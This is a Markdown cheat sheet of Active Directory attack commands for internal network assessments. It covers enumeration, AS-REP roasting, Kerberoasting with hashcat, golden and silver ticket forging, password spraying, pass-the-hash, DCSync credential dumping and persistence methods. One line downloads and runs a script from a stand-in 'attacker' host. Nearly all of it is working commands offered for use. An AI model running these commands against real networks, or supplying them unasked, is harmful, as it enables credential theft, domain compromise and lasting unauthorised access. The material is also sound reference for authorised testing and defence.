# Active Directory Attacks

Active Directory is one of the most common targets in internal network assessments. Focus on enumeration → credential access → lateral movement → domain dominance.

## Initial Recon & Enumeration

```bash
# Basic domain info
nxc ldap target -u '' -p '' --get-info
nxc smb target -u '' -p '' --users --groups --shares

# BloodHound collection (recommended first step)
# On a domain-joined Windows host or via SharpHound
IEX (New-Object Net.Webclient).DownloadString('http://attacker/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -Domain corp.local -ZipFileName loot.zip

# Linux collection
bloodhound-python -d corp.local -u user -p pass -c All -dc dc.corp.local --zip

# ldapsearch
ldapsearch -x -H ldap://target -b "dc=corp,dc=local" "(objectClass=*)"
```

### User & Computer Enumeration
```bash
# NetExec / CrackMapExec
nxc smb target -u users.txt -p pass.txt --users
nxc ldap target -u user -p pass --bloodhound --collection All

# PowerView (or SharpView)
Import-Module .\PowerView.ps1
Get-DomainUser -Identity * | select samaccountname, description
Get-DomainComputer | select name, operatingsystem
Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember
```

## Kerberos Attacks

### AS-REP Roasting (No Pre-Auth)
```bash
# impacket
python3 GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -outputfile asreproast.hash

# Rubeus (Windows)
Rubeus.exe asreproast /user:svc_sql /format:hashcat /outfile:asrep.hash
```

Crack with hashcat:
```bash
hashcat -m 18200 asrep.hash rockyou.txt
```

### Kerberoasting
```bash
# Impacket
python3 GetUserSPNs.py corp.local/user:pass -dc-ip dc.corp.local -request -outputfile kerberoast.hash

# Rubeus
Rubeus.exe kerberoast /outfile:kerberoast.hash /domain:corp.local

# Targeted
Rubeus.exe kerberoast /user:svc_web /domain:corp.local
```

Crack:
```bash
hashcat -m 13100 kerberoast.hash rockyou.txt
```

### Pass-the-Ticket & Silver/Golden Tickets
```bash
# Dump tickets
mimikatz # kerberos::list /export

# Pass-the-Ticket
mimikatz # kerberos::ptt C:\Users\admin\Downloads\admin.kirbi

# Silver Ticket (service account)
mimikatz # kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-... /target:dc.corp.local /service:cifs /rc4:<NTLM> /ptt

# Golden Ticket (KRBTGT hash needed)
mimikatz # kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /krbtgt:<krbtgt-NTLM> /ptt
```

## Password Attacks in AD

```bash
# Password spraying (kerbrute or nxc)
kerbrute passwordspray -d corp.local users.txt 'Summer2026!'

# NetExec spraying
nxc smb dc.corp.local -u users.txt -p 'Company2026!' --continue-on-success

# ASREPRoast + spraying combo (find users with no preauth)
```

## Lateral Movement

### Pass-the-Hash
```bash
# Impacket
python3 wmiexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:NTLMHASH corp.local/administrator@target

python3 secretsdump.py corp.local/admin@target -hashes :NTLMHASH

# Evil-WinRM
evil-winrm -i target -u admin -H NTLMHASH

# NetExec
nxc smb target -u admin -H NTLMHASH -x whoami
```

### WinRM / PSRemoting
```bash
# PowerShell
$secpasswd = ConvertTo-SecureString 'pass' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('corp\admin', $secpasswd)
Invoke-Command -ComputerName target -Credential $creds -ScriptBlock { whoami }

# With hash (using PSSession with CredSSP or tools)
```

### WMI / DCOM / SMB
```bash
# wmiexec (impacket)
wmiexec.py corp.local/admin:pass@target

# smbexec
smbexec.py corp.local/admin:pass@target

# CrackMapExec / NetExec
nxc smb target -u admin -p pass -x 'whoami /all'
nxc smb target -u admin -p pass --sam
```

## Domain Privilege Escalation Paths

### ACL / DACL Abuse (BloodHound finds these)
```powershell
# PowerView
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner"}

# Abuse GenericAll on user
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Verbose
```

### Kerberos Delegation
```bash
# Find unconstrained delegation
Get-DomainComputer -Unconstrained

# Constrained / Resource-based (RBCD)
# Use https://github.com/Kevin-Robertson/Powermad or Rubeus
Rubeus.exe monitor /interval:5
```

### DCSync
```bash
# From DA context or with DCSync rights
secretsdump.py corp.local/admin:pass@dc.corp.local -just-dc
impacket-secretsdump -just-dc-ntlm corp.local/admin:pass@dc

# Mimikatz
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

## Persistence Techniques

- **Golden Ticket** (see above)
- **Silver Ticket**
- **Skeleton Key** (mimikatz on DC)
- **DSRM** (Directory Services Restore Mode password)
- **AdminSDHolder** abuse
- **SID History** injection

## Useful Tool Commands (2026)

```bash
# NetExec (preferred over CME)
nxc smb target -u user -p pass --local-auth --sam --lsa --ntds
nxc ldap target -u user -p pass --trusted-for-delegation

# Certipy (AD CS attacks)
certipy find -u user@corp.local -p pass -dc-ip dc.corp.local
certipy auth -pfx admin.pfx -dc-ip dc.corp.local

# Rubeus (many attacks)
Rubeus.exe triage
Rubeus.exe dump /service:krbtgt /nowrap
```

## Quick BloodHound Analysis Workflow

1. Collect data with SharpHound or bloodhound-python.
2. Import ZIP into BloodHound.
3. Run queries:
   - Shortest path to Domain Admins
   - Users with most privileges
   - Kerberoastable accounts with SPNs
   - Computers with unconstrained delegation

## References & Tools
- BloodHound / BloodHound Community Edition
- Rubeus, SharpHound, PowerView
- Impacket (secretsdump, GetUserSPNs, wmiexec, etc.)
- NetExec / CrackMapExec
- Certipy (for AD CS)
- HackTricks Active Directory section
- PayloadsAllTheThings AD

**Always** start with good enumeration (BloodHound) before attempting exploitation.
